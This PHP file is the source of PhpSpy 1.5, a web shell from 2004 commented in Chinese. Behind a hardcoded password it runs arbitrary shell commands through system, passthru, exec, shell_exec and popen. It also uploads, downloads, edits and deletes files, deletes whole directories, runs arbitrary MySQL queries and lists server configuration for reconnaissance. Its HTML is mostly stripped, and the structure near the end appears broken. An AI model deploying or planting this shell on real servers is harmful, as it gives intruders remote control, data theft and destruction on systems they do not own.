<?php
/*
+--------------------------------------------------------------------------+
| PhpSpy Version:1.5                                                       |
| Codz by Angel                                                            |
| (c) 2004 Security Angel Team                                             |
| http://www.4ngel.net                                                     |
| ======================================================================== |
| Team:  http://www.4ngel.net                                              |
|        http://www.bugkidz.org                                            |
| Email: 4ngel@21cn.com                                                    |
| Date:  July 22st(My mother's birthday), 2004                             |
+--------------------------------------------------------------------------+
*/
error_reporting(7);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];

/*===================== 程序配置 =====================*/

// 是否需要密码验证,1为需要验证,其他数字为直接进入.下面选项则无效
$admin['check']="1";

// 验证方式,1为采用 Session 验证,其他数字则采用 Cookie验证
// 默认采用 Session 验证,如果不能正常登陆,建议改为 Cookie验证
$admin['checkmode']="1";

// 如果需要密码验证,请修改登陆密码
$admin['pass']="hkuser";

/*===================== 配置结束 =====================*/


// 允许程序在 register_globals = off 的环境下工作
if ( function_exists('ini_get') ) {
	$onoff = ini_get('register_globals');
} else {
	$onoff = get_cfg_var('register_globals');
}
if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
}

/*===================== 身份验证 =====================*/
if($admin['check']=="1") {
	if($admin['checkmode']=="1") {
	/*------- session 验证 -------*/
		session_start();
		if ($_GET['action'] == "logout") {
			session_destroy();
			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$_SERVER['PHP_SELF']."\">";
			echo "<span style=\"font-size: 12px; font-family: Verdana\">注销成功......<p><a href=\"".$_SERVER['PHP_SELF']."\">三秒后自动退出或单击这里退出程序界面&gt;&gt;&gt;</a></span>";
			exit;
		}
		if ($_POST['action'] == "login") {
			$adminpass=trim($_POST['adminpass']);
			if ($adminpass==$admin['pass']) {
				$_SESSION['adminpass'] = $admin['pass'];
				echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$_SERVER['PHP_SELF']."\">";
				echo "<span style=\"font-size: 12px; font-family: Verdana\">登陆成功......<p><a href=\"".$_SERVER['PHP_SELF']."\">三秒后自动跳转或单击这里进入程序界面&gt;&gt;&gt;</a></span>";
				exit;
			}
		}
		if (session_is_registered('adminpass')) {
			if ($_SESSION['adminpass']!=$admin['pass']) {
				loginpage();
			}
		} else {
			loginpage();
		}
	} else {
	/*------- cookie 验证 -------*/
		if ($_GET['action'] == "logout") {
			setcookie ("adminpass", "");
			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$_SERVER['PHP_SELF']."\">";
			echo "<span style=\"font-size: 12px; font-family: Verdana\">注销成功......<p><a href=\"".$_SERVER['PHP_SELF']."\">三秒后自动退出或单击这里退出程序界面&gt;&gt;&gt;</a></span>";
			exit;
		}
		if ($_POST['action'] == "login") {
			$adminpass=trim($_POST['adminpass']);
			if ($adminpass==$admin['pass']) {
				setcookie ("adminpass",$admin['pass'],time()+(1*24*3600));
				echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$_SERVER['PHP_SELF']."\">";
				echo "<span style=\"font-size: 12px; font-family: Verdana\">登陆成功......<p><a href=\"".$_SERVER['PHP_SELF']."\">三秒后自动跳转或单击这里进入程序界面&gt;&gt;&gt;</a></span>";
				exit;
			}
		}
		if (isset($_COOKIE['adminpass'])) {
			if ($_COOKIE['adminpass']!=$admin['pass']) {
				loginpage();
			}
		} else {
			loginpage();
		}
	}

}//end check
/*===================== 验证结束 =====================*/

// 判断 magic_quotes_gpc 状态
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
	$_POST = stripslashes_array($_POST);
}

// 下载文件
if (!empty($downfile)) {
	if (!@file_exists($downfile)) {
		echo "<script>alert('你要下的文件不存在!')</script>";
	} else {
		$filename = basename($downfile);
		$filename_info = explode('.', $filename);
		$fileext = $filename_info[count($filename_info)-1];
		header('Content-type: application/x-'.$fileext);
		header('Content-Disposition: attachment; filename='.$filename);
		header('Content-Description: PHP3 Generated Data');
		@readfile($downfile);
		exit;
	}
}

// 程序目录(文件系统)
$pathname=str_replace('\\','/',dirname(__FILE__)); 

// 获取当前路径
if (!isset($dir) or empty($dir)) {
	$dir = ".";
	$nowpath = getPath($pathname, $dir);
} else {
	$dir=$_GET['dir'];
	$nowpath = getPath($pathname, $dir);
}

// 判断读写情况
if (dir_writeable($nowpath)) {
	$dir_writeable = "可写";
} else {
	$dir_writeable = "不可写";
}

$dis_func = get_cfg_var("disable_functions");
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\">PHPINFO</a>" : "";
$shellmode=(!get_cfg_var("safe_mode")) ? " | <a href=\"?action=shell\">WebShell模式</a>" : "";
?><?php
if ($_GET['action'] == "phpinfo") {
	$dis_func = get_cfg_var("disable_functions");
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() 函数已被禁用,请查看&lt;PHP环境变量&gt;";
	exit;
}
?><?php
/*===================== 执行操作 开始 =====================*/
echo "<p><b>\n";
// 删除文件
if(@$delfile!="") {
	if(file_exists($delfile)) {
		@unlink($delfile);
		echo "".$delfile." 删除成功!";
	} else {
		echo "文件已不存在,删除失败!";
	}
}

// 删除目录
elseif($_POST['action'] == "rmdir") {
	if($deldir!="") {
		$deldirs="$dir/$deldir";
		if(!file_exists("$deldirs")) {
			echo "目录已不存在!";
		} else {
			deltree($deldirs);
		}
	} else {
		echo "删除失败!";
	}
}

// 创建目录
elseif($_POST['action'] == "createdirectory") {
	if(!empty($newdirectory)) {
		$mkdirs="$dir/$newdirectory";
		if(file_exists("$mkdirs")) {
			echo "该目录已存在!";
		} else {
			echo $msg=@mkdir("$mkdirs",0777) ? "创建目录成功!" : "创建失败!";
			@chmod("$mkdirs",0777);
		}
	}
}

// 上传文件
elseif($_POST['action'] == "uploadfile") {
	echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadmyfile']['name']."") ? "上传成功!" : "上传失败!";
}

// 编辑文件
elseif($_POST['action'] == "doeditfile") {
	$filename="$dir/$editfilename";
	@$fp=fopen("$filename","w");
	echo $msg=@fwrite($fp,$_POST['filecontent']) ? "写入文件成功!" : "写入失败!";
	@fclose($fp);
}

// 编辑文件属性
elseif($_POST['action'] == "editfileperm") {
	$fileperm=base_convert($_POST['fileperm'],8,10);
	echo $msg=@chmod($dir."/".$file,$fileperm) ? "属性修改成功!" : "修改失败!";
	echo " [".$file."] 修改后的属性为:".substr(base_convert(@fileperms($dir."/".$file),10,8),-4)."";
}

// 连接MYSQL
elseif($connect) {
	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
		echo "数据库连接成功!";
	} else {
		echo mysql_error();
	}
}

// 执行SQL语句
elseif($doquery) {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
	@mysql_select_db($dbname) or die("选择数据库失败");
	$result = @mysql_query($_POST['sql_query']);
	if ($result) {
		echo "SQL语句成功执行";
	}else{
		echo "出错: ".mysql_error();
	}
	mysql_close();
}

// 查看PHP配置参数状况
elseif($_POST['action'] == "viewphpvar") {
	echo "配置参数 ".$_POST['phpvarname']." 检测结果: ".getphpcfg($_POST['phpvarname'])."";
}

else {
	echo "本程序由 Security Angel 安全组织 angel[BST] 独立开发,可在 <a href=\"http://www.4ngel.net\" target=\"_blank\">http://www.4ngel.net</a> 下载最新版本.";
}

echo "</b></p>\n";
/*===================== 执行操作 结束 =====================*/

if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
?><?php
// 目录列表
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
	$b="$dir/$file";
	$a=@is_dir($b);
	if($a=="1"){
		if($file!=".."&&$file!=".")	{
			$lastsave=@date("Y-n-d H:i:s",filemtime("$dir/$file"));
			$dirperm=substr(base_convert(fileperms("$dir/$file"),10,8),-4);
			echo "<tr class=".getrowbg().">\n";
			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\">$lastsave</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\">&lt;dir&gt;</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=deldir&dir=".urlencode($dir)."&deldir=".urlencode($file)."\">删除</a></td>\n";
			echo "</tr>\n";
		} else {
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"5\" style=\"padding-left: 5px;\"><a href=\"?dir=".$dir."/".$file."\">返回上级目录</a></td>\n";
				echo "</tr>\n";
			}
		}
		$dir_i++;
	}
}//while
@closedir($dirs); 

// 文件列表
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
	$b="$dir/$file";
	$a=@is_dir($b);
	if($a=="0"){
		$size=@filesize("$dir/$file");
		$size=$size/1024 ;
		$size= @number_format($size, 3);    
		$lastsave=@date("Y-n-d H:i:s",filectime("$dir/$file"));
		@$fileperm=substr(base_convert(fileperms("$dir/$file"),10,8),-4);
		echo "<tr class=".getrowbg().">\n";
		echo "  <td style=\"padding-left: 5px;\"><a href=\"$dir/$file\" target=\"_blank\">$file</a></td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\">$lastsave</td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\">$size KB</td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?downfile=".urlencode($dir)."/".urlencode($file)."\">下载</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">编辑</a> | <a href=\"?dir=".urlencode($dir)."&delfile=".urlencode($dir)."/".urlencode($file)."\">删除</a></td>\n";
		echo "</tr>\n";
		$file_i++;
	}
}
@closedir($dirs); 

echo "<tr class=".getrowbg().">\n";
echo "  <td nowrap colspan=\"5\" align=\"right\">".$dir_i." 个目录<br>".$file_i." 个文件</td>\n";
echo "</tr>\n";
?><?php
}// end dir

elseif ($_GET['action'] == "editfile") {
	if($newfile=="") {
		$filename="$dir/$editfile";
		$fp=@fopen($filename,"r");
		$contents=@fread($fp, filesize($filename));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}else{
		$editfile=$newfile;
		$filename = "$dir/$editfile";
	}
?><?php
}//end editfile

elseif ($_GET['action'] == "shell") {
	if (!get_cfg_var("safe_mode")) {
?><?php
	if (!empty($_POST['command'])) {
		if ($execfunc=="system") {
			system($_POST['command']);
		} elseif ($execfunc=="passthru") {
			passthru($_POST['command']);
		} elseif ($execfunc=="exec") {
			$result = exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="shell_exec") {
			$result=shell_exec($_POST['command']);
			echo $result;	
		} elseif ($execfunc=="popen") {
			$pp = popen($_POST['command'], 'r');
			$read = fread($pp, 2096);
			echo $read;
			pclose($pp);
		} else {
			system($_POST['command']);
		}
	}
	?><?php
	} else {
?><?php
	}
}//end shell

elseif ($_GET['action'] == "deldir") {
?><?php
}//end deldir

elseif ($_GET['action'] == "fileperm") {
?><?php
}//end fileperm

elseif ($_GET['action'] == "sql") {
	$servername = isset($servername) ? $servername : '127.0.0.1';
	$dbusername = isset($dbusername) ? $dbusername : 'root';
	$dbpassword = isset($dbpassword) ? $dbpassword : '';
	$dbname = isset($dbname) ? $dbname : '';
?><?php
}//end sql query

elseif ($_GET['action'] == "phpenv") {
	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";

	$adminmail=(isset($_SERVER["SERVER_ADMIN"])) ? "<a href=\"mailto:".$_SERVER["SERVER_ADMIN"]."\">".$_SERVER["SERVER_ADMIN"]."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";

	$dis_func = get_cfg_var("disable_functions");
	if ($dis_func == "") {
		$dis_func = "No";
	}else {
		$dis_func = str_replace(" ","<br>",$dis_func);
		$dis_func = str_replace(",","<br>",$dis_func);
	}
	
	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";

	$info[0]  = array("服务器时间",date("Y年m月d日 h:i:s",time()));
	$info[1]  = array("服务器域名","<a href=\"http://$_SERVER[SERVER_NAME]\" target=\"_blank\">$_SERVER[SERVER_NAME]</a>");
	$info[2]  = array("服务器IP地址",gethostbyname($_SERVER["SERVER_NAME"]));
	$info[3]  = array("服务器操作系统",PHP_OS);
	$info[5]  = array("服务器操作系统文字编码",$_SERVER["HTTP_ACCEPT_LANGUAGE"]);
	$info[6]  = array("服务器解译引擎",$_SERVER["SERVER_SOFTWARE"]);
	$info[7]  = array("Web服务端口",$_SERVER["SERVER_PORT"]);
	$info[8]  = array("PHP运行方式",strtoupper(php_sapi_name()));
	$info[9]  = array("PHP版本",PHP_VERSION);
	$info[10] = array("运行于安全模式",getphpcfg("safemode"));
	$info[11] = array("服务器管理员",$adminmail);
	$info[12] = array("本文件路径",__FILE__);
	
	$info[13] = array("允许使用 URL 打开文件 allow_url_fopen",getphpcfg("allow_url_fopen"));
	$info[14] = array("允许动态加载链接库 enable_dl",getphpcfg("enable_dl"));
	$info[15] = array("显示错误信息 display_errors",getphpcfg("display_errors"));
	$info[16] = array("自动定义全局变量 register_globals",getphpcfg("register_globals"));
	$info[17] = array("magic_quotes_gpc",getphpcfg("magic_quotes_gpc"));
	$info[18] = array("程序最多允许使用内存量 memory_limit",getphpcfg("memory_limit"));
	$info[19] = array("POST最大字节数 post_max_size",getphpcfg("post_max_size"));
	$info[20] = array("允许最大上传文件 upload_max_filesize",$upsize);
	$info[21] = array("程序最长运行时间 max_execution_time",getphpcfg("max_execution_time")."秒");
	$info[22] = array("被禁用的函数 disable_functions",$dis_func);
	$info[23] = array("phpinfo()",$phpinfo);
	$info[24] = array("目前还有空余空间diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb');

	$info[25] = array("图形处理 GD Library",getfun("imageline"));
	$info[26] = array("IMAP电子邮件系统",getfun("imap_close"));
	$info[27] = array("MySQL数据库",getfun("mysql_close"));
	$info[28] = array("SyBase数据库",getfun("sybase_close"));
	$info[29] = array("Oracle数据库",getfun("ora_close"));
	$info[30] = array("Oracle 8 数据库",getfun("OCILogOff"));
	$info[31] = array("PREL相容语法 PCRE",getfun("preg_match"));
	$info[32] = array("PDF文档支持",getfun("pdf_close"));
	$info[33] = array("Postgre SQL数据库",getfun("pg_close"));
	$info[34] = array("SNMP网络管理协议",getfun("snmpget"));
	$info[35] = array("压缩文件支持(Zlib)",getfun("gzclose"));
	$info[36] = array("XML解析",getfun("xml_set_object"));
	$info[37] = array("FTP",getfun("ftp_login"));
	$info[38] = array("ODBC数据库连接",getfun("odbc_close"));
	$info[39] = array("Session支持",getfun("session_start"));
	$info[40] = array("Socket支持",getfun("fsockopen"));
?><?php
	for($a=0;$a<3;$a++){
		if($a == 0){
			$hp = array("server","服务器特性");
		}elseif($a == 1){
			$hp = array("php","PHP基本特性");
		}elseif($a == 2){
			$hp = array("basic","组件支持状况");
		}
?><?php
	debuginfo();
	ob_end_flush();	
	?><?php

/*======================================================
函数库
======================================================*/

	// 登陆入口
	function loginpage() {
?><?php
		exit;
	}//end loginpage()

	// 页面调试信息
	function debuginfo() {
		global $starttime;
		$mtime = explode(' ', microtime());
		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
		echo "Processed in $totaltime second(s)";
	}

	// 去掉转义字符
	function stripslashes_array(&$array) {
		while(list($key,$var) = each($array)) {
			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
				if (is_string($var)) {
					$array[$key] = stripslashes($var);
				}
				if (is_array($var))  {
					$array[$key] = stripslashes_array($var);
				}
			}
		}
		return $array;
	}

	// 删除目录
	function deltree($deldir) {
		$mydir=@dir($deldir);	
		while($file=$mydir->read())	{ 		
			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
				@chmod("$deldir/$file",0777);
				deltree("$deldir/$file"); 
			}
			if (is_file("$deldir/$file")) {
				@chmod("$deldir/$file",0777);
				@unlink("$deldir/$file");
			}
		} 
		$mydir->close(); 
		@chmod("$deldir",0777);
		echo @rmdir($deldir) ? "<b>目录删除成功!</b>" : "<font color=\"#ff0000\">目录删除失败!</font>";	
	} 

	// 判断读写情况
	function dir_writeable($dir) {
		if (!is_dir($dir)) {
			@mkdir($dir, 0777);
		}
		if(is_dir($dir)) {
			if ($fp = @fopen("$dir/test.txt", 'w')) {
				@fclose($fp);
				@unlink("$dir/test.txt");
				$writeable = 1;
			} else {
				$writeable = 0;
			}
		}
		return $writeable;
	}

	// 表格行间的背景色替换
	function getrowbg() {
		global $bgcounter;
		if ($bgcounter++%2==0) {
			return "firstalt";
		} else {
			return "secondalt";
		}
	}

	// 获取当前的文件系统路径
	function getPath($mainpath, $relativepath) {
		global $dir;
		$mainpath_info           = explode('/', $mainpath);
		$relativepath_info       = explode('/', $relativepath);
		$relativepath_info_count = count($relativepath_info);
		for ($i=0; $i<$relativepath_info_count; $i++) {
			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
			if ($relativepath_info[$i] == '..') {
				$mainpath_info_count = count($mainpath_info);
				unset($mainpath_info[$mainpath_info_count-1]);
				continue;
			}
			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
		} //end for
		return implode('/', $mainpath_info);
	}

	// 检查PHP配置参数
	function getphpcfg($varname) {
		switch($result = get_cfg_var($varname)) {
			case 0:
			return No;
			break;
			case 1:
			return Yes;
			break;
			default:
			return $result;
			break;
		}
	}

	// 检查函数情况
	function getfun($funName) {
		return (false !== function_exists($funName)) ? Yes : No;
	}
?>